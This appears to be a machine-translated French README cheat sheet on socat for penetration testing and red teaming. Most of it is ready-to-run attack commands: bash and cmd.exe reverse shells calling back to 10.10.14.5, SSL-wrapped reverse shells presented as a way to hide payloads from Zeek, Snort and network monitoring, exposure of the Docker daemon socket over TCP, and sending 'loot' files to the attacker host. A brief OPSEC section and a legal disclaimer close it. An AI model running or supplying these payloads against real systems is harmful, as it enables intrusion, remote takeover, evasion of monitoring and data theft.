<!-- language-home-navigation -->
[🏠 Page d'accueil Française](../../README.fr.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe](README.tr.md) • [🇩🇪 Deutsch](README.de.md) • [🇪🇸 Español](README.es.md) • [🇮🇹 Italiano](README.it.md)

[🇵🇹 Português](README.pt.md) • [🇷🇺 Русский](README.ru.md) • [🇨🇳 简体中文](README.zh-CN.md) • [🇸🇦 العربية](README.ar.md) • [🇬🇷 Ελληνικά](README.el.md) • [🇳🇴 Norsk](README.nb.md) • [🇬🇧 English](../README.md)

---


# 🔄 Socat - Aide-mémoire complet

[🇹🇷 Türkçe Sürüm](translations/README.tr.md)
```
  ███████╗ ██████╗  ██████╗ █████╗ ████████╗
  ██╔════╝██╔═══██╗██╔════╝██╔══██╗╚══██╔══╝
  ███████╗██║   ██║██║     ███████║   ██║   
  ╚════██║██║   ██║██║     ██╔══██║   ██║   
  ███████║╚██████╔╝╚██████╗██║  ██║   ██║   
  ╚══════╝ ╚═════╝  ╚═════╝╚═╝  ╚═╝   ╚═╝   
       Multipurpose Relay for Bidirectional Data Transfers & Full TTY Shells
```
<p align="center">
  <img src="https://img.shields.io/badge/Socat-SOcket_CAT-blue?style=for-the-badge" alt="Socat">
  <img src="https://img.shields.io/badge/Category-Exploitation_&_Shells-orange?style=for-the-badge" alt="Exploitation et obus">
  <img src="https://img.shields.io/badge/Protocols-TCP_UDP_SSL_UNIX-green?style=for-the-badge" alt="Protocoles">
  <img src="https://img.shields.io/badge/License-GPLv2-red?style=for-the-badge" alt="Licence GPLv2">
</p>

<p align="center">
  <b>🌐 Établissez deux flux d'octets bidirectionnels et transférez des données entre les fichiers, les canaux, les périphériques, les sockets et les tunnels SSL</b>
</p>

---

## 📋 Table des matières

- [Vue d'ensemble et l'architecture Socat](#-overview--the-socat-architecture)
- [Comparaison Socat vs Netcat] (#-socat-vs-netcat-comparison)
- [Installation](#-installation)
- [Coquilles inversées TTY entièrement interactives] (#-coquilles inversées entièrement interactives)
  - [Attacker Listener (RAW TTY)](#attaquant-listener-raw-tty)
  - [Charge utile cible (Pty Spawn)](#target-payload-pty-spawn)
  - [Windows Target Reverse Shell](#windows-target-reverse-shell)
- [Coquilles inversées cryptées via SSL/TLS](#-encrypted-reverse-shells-via-ssltls)
  - [Génération de certificats](#generating-certificates)
  - [Écouteur et connexion cryptés](#encrypted-listener--connection)
- [Redirection de port et relais réseau](#-port-forwarding--network-relays)
  - [Redirection de port local](#local-port-forwarding)
  -[Forking Listener (Multi-Client)](#forking-listener-multi-client)
  - [Socket de domaine UNIX vers relais TCP (transfert Docker)](#unix-domain-socket-to-tcp-relay-docker-forwarding)
- [Transferts de fichiers avec Socat](#-file-transfers-with-socat)
- [Tableau de référence rapide](#-quick-reference-table)
- [Considérations défensives et OPSEC](#-defensive-considérations--opsec)
- [Mentions légales](#-legal-disclaimer)

---

## 🎯 Présentation et architecture Socat

**Socat** (SOcket CAT) est un utilitaire basé sur une ligne de commande qui établit deux flux d'octets bidirectionnels et transfère des données entre eux. Étant donné que les flux peuvent être construits à partir d'un vaste ensemble de types d'adresses (fichiers, canaux, périphériques, sockets TCP/UDP, SSL, IP brute, SOCKS4, sockets de domaine UNIX), Socat est souvent décrit comme Netcat sous stéroïdes.

Dans les tests d'intrusion et le Red Teaming, Socat est légendaire pour deux super pouvoirs fondamentaux :
1. **Coquilles inversées TTY instantanées entièrement interactives :** Génération de véritables pseudoterminaux (`pty`) avec contrôle des tâches, touches fléchées et saisie semi-automatique sans avoir besoin de gymnastique Python ou `stty raw -echo`.
2. **Tunnels réseau SSL/TLS cryptés :** Contournement de l'inspection IDS standard en cryptant les charges utiles en texte clair via SSL.

---

## ⚖️ Comparaison Socat vs Netcat

| Fonctionnalité | Netcat (`nc`) | Nmap `ncat` | Socat (`socat`) |
|---------|---------------|-------------|------------------|
| **Pty Shell Spawn natif** | ❌ Non | ❌ Non | ✅ Natif (`pty,stderr,setsid`) |
| **Cryptage SSL/TLS** | ❌ Non | ✅ Oui (`--ssl`) | ✅ Natif (`OPENSSL-LISTEN`, `OPENSSL`) |
| **Relais multi-clients Forking**| ❌ Non | ❌ Non | ✅ Natif (`fork,reuseaddr`) |
| **Sockets de domaine UNIX** | ❌ Non | ✅ Limité | ✅ Natif (`UNIX-LISTEN`, `UNIX-CONNECT`) |
| **Taille du fichier binaire** | Minime (~ 40 Ko) | Modéré (~ 500 Ko) | Modéré (~ 400 Ko autonome) |
| **Syntaxe de commande** | Drapeaux simples (`-lvnp`) | Basé sur un indicateur (`-lvnp`) | Syntaxe du flux (`<type>:<args>`) |

---

## 📥Installation
```bash
# Debian / Ubuntu / Kali Linux
sudo apt update && sudo apt install -y socat

# Arch Linux
sudo pacman -S socat

# RedHat / CentOS / Fedora
sudo dnf install -y socat
```
---

## 💀 Coquilles inversées TTY entièrement interactives

Lorsque vous attrapez un shell inversé avec Netcat standard, vous recevez un shell muet instable. Socat permet un pseudo-terminal 100 % stable et entièrement interactif avec complétion par tabulation, gestion Ctrl+C et prise en charge de l'éditeur d'écran (`vim`, `nano`).

### Écouteur d'attaquant (RAW TTY)
```bash
# Listen on port 4444 and hook stdin/stdout directly to your current raw terminal
socat file:`tty`,raw,echo=0 tcp-listen:4444
```
> [!NOTE]
> `file:`tty`,raw,echo=0` met votre terminal local en mode brut et désactive l'écho des caractères. Si la connexion se ferme de manière inattendue et que votre terminal ne répond pas, tapez `reset` et appuyez sur Entrée.

### Charge utile cible (Pty Spawn)
```bash
# Target connects back, spawning a fully interactive PTY bash shell
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.10.14.5:4444
```
#### Répartition des options :
- `pty` : Alloue un pseudo-terminal sur le système cible.
- `stderr` : Redirige l'erreur standard vers le socket.
- `setsid` : exécute le processus dans un nouveau groupe de session (empêche l'arrêt lorsque le parent quitte).
- `sigint` : transmet les signaux d'interruption (Ctrl+C) au processus distant au lieu de tuer la session.
- `sane` : réinitialise les paramètres de contrôle du terminal aux valeurs par défaut standard.

### Shell inversé de la cible Windows
```bash
# Attacker listener
socat -d -d TCP-LISTEN:4444 STDOUT

# Windows Target connection
socat TCP:10.10.14.5:4444 EXEC:cmd.exe
```
---

## 🔐 Shells inversés cryptés via SSL/TLS

Empêchez Network Security Monitoring (NSM), Zeek et Snort d'inspecter votre charge utile de shell inversé en chiffrant le trafic avec un certificat SSL/TLS éphémère.

### Génération de certificats
```bash
# 1. Generate private key and self-signed certificate on attacker machine
openssl req -newkey rsa:2048 -nodes -keyout /tmp/socat.key -x509 -days 365 -out /tmp/socat.crt -subj "/CN=corp-update.local"

# 2. Combine key and cert into a single PEM bundle
cat /tmp/socat.key /tmp/socat.crt > /tmp/socat.pem
```
### Écouteur et connexion cryptés
```bash
# 1. Attacker starts an SSL listener
socat file:`tty`,raw,echo=0 OPENSSL-LISTEN:4443,cert=/tmp/socat.pem,verify=0

# 2. Target connects back over SSL
socat OPENSSL:10.10.14.5:4443,verify=0 exec:'bash -li',pty,stderr,setsid,sigint,sane
```
---

## 🔀 Redirection de port et relais réseau

Socat peut transférer le trafic entrant d'une interface réseau ou d'un port directement vers une autre cible distante.

### Redirection de port local
```bash
# Forward incoming connections on port 8080 to an internal database server
socat TCP-LISTEN:8080,fork TCP:192.168.1.50:3306
```
### Écouteur Forking (multi-client)

L'option `fork` permet à Socat de générer un processus enfant pour chaque nouvelle connexion entrante, en gardant l'écouteur principal ouvert :
```bash
# Multi-client HTTP proxy relay
socat TCP-LISTEN:80,fork,reuseaddr TCP:10.10.10.200:80
```
### Socket de domaine UNIX vers relais TCP (transfert Docker)

Lors de l'accès à un socket de démon Docker local (`/var/run/docker.sock`) sans droits root sur le réseau :
```bash
# Expose Docker UNIX socket over TCP port 2375
socat TCP-LISTEN:2375,reuseaddr,fork UNIX-CLIENT:/var/run/docker.sock

# Connect remotely from attacker machine
docker -H tcp://10.10.10.50:2375 ps
```
---

## 📁 Transferts de fichiers avec Socat
```bash
# 1. Attacker prepares receiving listener
socat -u TCP-LISTEN:9001,reuseaddr OPEN:loot.tar.gz,creat

# 2. Target sends file to attacker
socat -u OPEN:loot.tar.gz TCP:10.10.14.5:9001
```
*(L'indicateur `-u` spécifie le mode unidirectionnel de la première adresse à la seconde).*

---

## ⚡ Tableau de référence rapide

| Objectif | Commande |
|-----------|---------|
| **Écouteur TTY interactif** | `socat file:\`tty\`,raw,echo=0 tcp-listen:<PORT>` |
| **Charge utile TTY interactive** | `socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:<IP>:<PORT>` |
| **Écouteur SSL crypté** | `socat file:\`tty\`,raw,echo=0 OPENSSL-LISTEN:<PORT>,cert=<PEM>,verify=0` |
| **Charge utile SSL cryptée** | `socat OPENSSL:<IP>:<PORT>,verify=0 exec:'bash -li',pty,stderr,setsid,sigint,sane` |
| **Redirection de port (relais)** | `socat TCP-LISTEN:<LPORT>,fork,reuseaddr TCP:<RHOST>:<RPORT>` |
| **Exposer le socket UNIX** | `socat TCP-LISTEN:<PORT>,fork UNIX-CLIENT:<SOCKET_PATH>` |
| **Transfert de fichiers (récepteur)** | `socat -u TCP-LISTEN:<PORT> OPEN:<OUTFILE>,creat` |
| **Transfert de fichiers (expéditeur)** | `socat -u OPEN:<INFILE> TCP:<IP>:<PORT>` |

---

## 🛡️ Considérations défensives et OPSEC

1. **Cryptage du trafic :** Les shells inversés Cleartext TCP exposent les commandes à IDS/IPS. Utilisez toujours `OPENSSL-LISTEN` et `OPENSSL` lors des engagements de l'équipe rouge.
2. **Surveillance des processus :** Les plates-formes Sysmon/EDR signalent les commandes appelant `pty,stderr,setsid` comme heuristique de shell inverse immédiate.
3. **Binaires autonomes :** Lors du déploiement sur les systèmes cibles, utilisez des binaires Socat autonomes compilés de manière statique pour éviter les dépendances de bibliothèques partagées.

---

## ⚠️ Mentions légales

> [!ATTENTION]
> Cette aide-mémoire est destinée uniquement aux tests d'intrusion autorisés, aux évaluations de sécurité et à la recherche universitaire. L'accès non autorisé aux systèmes informatiques et la falsification du réseau sont strictement illégaux.